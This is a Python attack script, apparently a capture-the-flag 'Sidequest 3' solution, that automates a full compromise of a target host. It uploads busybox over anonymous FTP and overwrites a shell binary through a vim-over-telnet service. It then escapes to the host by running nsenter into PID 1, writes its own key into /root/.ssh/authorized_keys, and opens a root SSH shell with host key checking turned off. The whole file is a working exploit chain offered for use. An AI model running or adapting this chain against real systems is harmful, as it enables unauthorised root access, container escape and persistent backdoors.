#!/usr/bin/env python
from warnings import filterwarnings
filterwarnings("ignore")
import argparse
import paramiko
import telnetlib
import time
import os
import sys
import subprocess
from termcolor import colored
from ftplib import FTP


def isAlive(address):
    try:
        subprocess.check_output(['ping', '-c', '1', address])
        return True
    except subprocess.CalledProcessError:
        return False

def cleanup():
    if os.path.exists('./binaries/id_rsa') or os.path.exists('./binaries/id_rsa.pub'):
        try:
            os.remove("./binaries/id_rsa")
            os.remove("./binaries/id_rsa.pub")
        except Exception as e:
            sys.exit(0)

def stylePrint(s):
    for c in s:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.01)
        
def print_dangerous(message):
    dangerous_icon = colored("[âœ”] ðŸ’€", 'red')  # You can customize the icon
    decorated_message = f"{dangerous_icon} {colored(message, 'red')}"
    print(decorated_message)


def print_statement(setting_name, success=True):
    if success:
        tick_mark = colored("[âœ”]", 'green')
        statement = colored(f"{setting_name}", 'white')
        stylePrint(f"{tick_mark} {statement}\n")
    else:
        cross_mark = colored("[âœ–]", 'red')
        statement = colored(f"{setting_name}", 'yellow')
        stylePrint(f"{cross_mark} {statement}\n")

def sendVimCommand(connection, command):
    try:
        connection.write(command.encode('utf-8') + b'\n')
        time.sleep(2)  # Just to make sure everything works fine
        return 200
    except Exception as e:
        print_statement(f"Error in sendVimCommand Module: {e}",success=False)
        return 404
    
def generateSSHKeys():
    key = paramiko.RSAKey.generate(2048)
    private_key_path = './binaries/id_rsa'
    public_key_path = './binaries/id_rsa.pub'

    with open(private_key_path, 'w') as private_key_file:
        key.write_private_key(private_key_file)

    with open(public_key_path, 'w') as public_key_file:
        public_key_file.write(f"{key.get_name()} {key.get_base64()}\n")
        
    os.system('chmod 600 ./binaries/id_rsa')
    os.system('chmod 600 ./binaries/id_rsa.pub')
    return True

def checkSSHKeys():
    private="./binaries/id_rsa"
    public="./binaries/id_rsa.pub"
    currentDirectory=os.getcwd()
    privateExist = os.path.join(currentDirectory, private)
    publicExist = os.path.join(currentDirectory, public)
    if (os.path.isfile(privateExist) and os.path.isfile(publicExist)):
        return True
    else:
        return False
    
def overWrite(address):
    binariesList={
        "/tmp/ftp/busybox":"/usr/frosty/sh",
    }
    connection=telnetlib.Telnet(address, port=8085)
    for binary in binariesList:
        response=sendVimCommand(connection=connection,command=f":edit {binary} | :w! {binariesList[binary]} | :q")
    connection.close()
    if response == 200:
            return response
    else:
        return 404
    
def hijack(address):
    print_dangerous("Hijacking machine")
    connection=telnetlib.Telnet(address, port=8065)
    with open('./binaries/id_rsa.pub', 'r') as f:
         content = f.read()
    try:
        injection = f'echo "{content}" > /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys'
    except IOError:
        print(f"Error id_rsa.pub not found")
    except Exception as e:
        print(f"Error : {e}")
    
    commands={
        "Hijacking PID":"nsenter --target 1 --mount --uts --ipc --net --pid -- bash",
        "Injecting SSH Keys":f"{injection}"
    }
    for command in commands:
        print_dangerous(f"{command}\t\t: {address} / 8065")
        response=sendVimCommand(connection=connection,command=f"{commands[command]}")
        if response == 200:
            continue
        else:
            print_statement(f"Failed to execute : {commands[command]}",success=False)
            sys.exit(1)
    connection.close()
    return response        


def uploadBinary(fileList, address):
    ftpPort = 8075
    ftp = FTP()
    ftp.connect(address, ftpPort)
    ftp.set_pasv(False)
    authStatus = ftp.login()
    toUpload = 2  # Just a counter to keep track of the successful uploads
    try:
        if '230' in authStatus:
            for file in fileList:
                for filePath, fileName in file.items():   # Getting the key, value from the dictionary
                    with open(filePath, 'rb') as f:
                        try:
                            print_statement(f"Uploading\t\t\t: {colored(f'{fileName}', 'yellow')}",success=True)
                            ftp.storbinary(f'STOR {fileName}', f)
                            toUpload -= 1
                        except Exception as e:
                            print_statement(f"Error in uploadBinary : {e}")
        if toUpload == 0:  # If all files are uploaded successfully, we return 200.
            ftp.close()
            return 200
        else:
            ftp.close()
            return 404
    except Exception as e:
        print_statement(f"Error in uploadBinary module: {e}")
        ftp.close()

def connectSSH(address):
    os.system(f'ssh -i ./binaries/id_rsa -q -o StrictHostKeyChecking=no root@{address} 2>/dev/null')
    print(colored("ðŸ‘‹ Bye!", 'blue'))
    cleanup()
    sys.exit(0)
    
    
if __name__ == '__main__':
    try:
        parser = argparse.ArgumentParser(description='Sidequest 3 pwn script')
        parser.add_argument("--address", "-a", dest="address", required=True, help="Server IP Address")
        args = parser.parse_args()
        address = args.address
        if not isAlive(address):
            print_statement("Host Down",success=False)
            sys.exit(0)
        ## Upload the Files First
        if not checkSSHKeys():
            generateSSHKeys()
        binaryList = [
            {
            './binaries/busybox': 'busybox',
            }
        ]
        print_dangerous(f"Hacking into Server\t: {colored(f'{address}','white')} / {colored(f'{8075}', 'green')}")
        print("\n")
        uploadResponse=uploadBinary(fileList=binaryList,address=address)
        # Overwrite Files
        print("\n")
        print_statement(f"Overwriting Files\t\t: {colored(f'{address}', 'yellow')} / {colored(f'{8085}', 'green')}")
        overWriteResponse = overWrite(address=address)
        # Hijack the PID
        print_statement(f"Escalating Privileges\t: {colored(f'{address}', 'yellow')} / {colored(f'{8065}', 'green')}")
        hijackResponse = hijack(address=address)
        print("\n")
        stylePrint(colored("[âœ”] ðŸ“¡ Ready for the connection!\n", 'cyan'))
        print_dangerous("Executing SSH Shell")
        connectSSH(address=address)
        print(colored("ðŸ‘‹ Bye!", 'blue'))
        cleanup()
        sys.exit(0)
    except Exception as e:
        print(f"Error : {e}")
        print(colored("ðŸ‘‹ Bye!", 'blue'))
        cleanup()
        sys.exit(0)
    except KeyboardInterrupt:
        print(colored("ðŸ‘‹ Bye!", 'blue'))
        cleanup()
        sys.exit(0)